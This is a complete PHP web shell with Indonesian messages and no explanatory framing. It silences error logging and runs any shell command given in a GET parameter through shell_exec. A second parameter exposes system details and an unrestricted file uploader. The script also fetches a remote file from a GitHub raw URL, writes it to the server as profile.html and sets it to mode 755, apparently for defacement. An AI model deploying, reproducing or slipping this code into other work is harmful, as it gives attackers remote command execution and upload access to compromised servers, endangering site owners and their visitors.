<?php
ob_start();
@error_reporting(0); 
@ini_set('error_log',NULL);
if($_GET['HsH']){echo"<pre>".shell_exec($_GET["HsH"]);}
if ( isset($_GET['jancok']) )
{
echo '<b>HsH uploader</b>';
echo '<b><br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload file sukses gan, happy pentest bro!</b><br><br>'; }
else { echo '<b>Yah sayang uploadnya gagal pak, cari cara lain lagi ya :(</b><br><br>'; }

}
 
	$prof = "https://raw.githubusercontent.com/IDTT/Js/master/profile.txt";
    $crot = file_get_contents($prof);
    $open = fopen("profile.html" , 'w');
    fwrite($open,$crot);
    fclose($open);
     if($open) {
         echo "<center><br>  <p><span style='background-color: black; color: lime;'>profile.html =========>> 100% Success Full</span></p></center>";
     } else {
         echo "<center><br> <p><span style='background-color: black; color: red;'>profile.html gak iso diget cok</span></p></center>";
     }
	 
	 $chmodcok = "profile.html";
	 chmod($chmodcok, 0755);
     if($chmodcok){
         echo "<center><br>  <p><span style='background-color: black; color: lime;'>profile.html chmod 755 Berhasil</span></p></center>";
     } else {
            echo "<center><br> <p><span style='background-color: black; color: red;'>profile.html gak iso chmod cok</span></p></center>";
     }

exit;
}
?>
